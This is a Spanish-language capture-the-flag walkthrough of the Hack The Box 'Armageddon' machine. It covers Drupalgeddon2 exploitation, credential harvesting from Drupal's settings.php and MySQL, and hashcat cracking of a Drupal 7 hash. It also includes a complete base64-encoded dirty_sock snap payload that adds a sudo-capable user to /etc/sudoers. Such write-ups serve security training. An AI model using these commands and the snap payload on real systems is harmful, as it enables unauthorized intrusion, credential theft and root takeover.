maquina armagedon htb ---------------------------------linux

aprendizaje 

PHP
Drupal
Penetration Tester Level 1
Web
Vulnerability Assessment
Source Code Analysis
Outdated Software
Authentication
Password Reuse
Password Cracking
SUDO Exploitation
Weak Credentials
Clear Text Credentials
Misconfiguration

------------------------------------------------------

esta maquina lo primero que nos encontramos es una pagina web con el wapallizzer vemos que esta formada por drupal 
pero no encontramos ningun directorio ni subdominio interesante

el tema es que nos tira un version de drupal interesante que es la drupal 7 y hemos buscado unos exploits sin exito 

el tema es que hemos visto que hay uno que se llama drupalgedon2 que podemos usar, esta formado por ruby y cuando 
lo hemos lanzado despues de instalar la dependencias nos ha metido como user "armagedon" que no podemos hacer 
practicamente nada la verdad. 

pero podemos ver un archivo de configuracion que esta en esta ruta y nos ha arrojado esto 

RUTA: cat /var/www/html/sites/default/settings.php

CONTENIDO 

 'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',< --------------------------------user
      'password' => 'CQHEy@9M*m23gBVj',< --------------------------pass
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql', < --------------------- DB
      'prefix' => '',


en este docmento nos da 3 pistas valiosas, un user, una pass y una base de datos 
    

el tema es que hemos enumerado un poco el mysql con los datos que teniamos con estos comandos (los pongo seguidos) 

mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables;'
mysql -u drupaluser -p CQHEy@9M*m23gBVj -e 'use drupal; select * from users;'

con eso nos ha soltado otra contraseña que es de otro usuario que previamente habiamos visto en el /etc/passwd 

brucetherealadmin: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt

el caso es que eso es un hash y ninguna pagina nos ha soltado nada el tema es que esta encryptado en drupal7

y la idea es buscar como hacerlo con hascat 

		hascat -h | grep -i drupal

con ese comando nos suelta una id que es la 7900 

hemos tirado este comando para poder sacarla en un documento aparte

		echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash

con esto lo hemos hecho es meterlo en un documento para posteriormente usar lo con hascat 

		sudo hashcat -m 7900 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt --force

y con eso lo que hace es meter la contraseña en un documento que nos ha dado "booboo" 

y con eso nos hemos metido por ssh. con eso hemos concluido el movimiento lateral... 

---------

hemos hecho sudo -l para ver los binarios tambien hemos hecho lo tipico, del find y getcap 
y nos ha salido que tenemos esto sudo snap install *

hemos buscado por internet y hemos encontrado una manera de hacer que snap nos cree un usuario 
para poder entrar con el y hacer un sudo -i 

la web seria esta 

https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1

la explicacion, de los comandos seria esta

ESTE COMANDO CREEA UN DOCUMENTO EN TU MAQUINA PARA PODER TRANSFERIRLO

python -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snap

cuando lo has pasado a la otra maquina con un servidor python ejecutamos este 

sudo snap install /dev/shm/payload.snap --dangerous --devmode

y eso nos ha creado un usuario, que se llama dirty_sock con la contraseña dirty_sock

cambiamos de usuario con su dirty_sock y hacemos sudo -i y listo somos root.



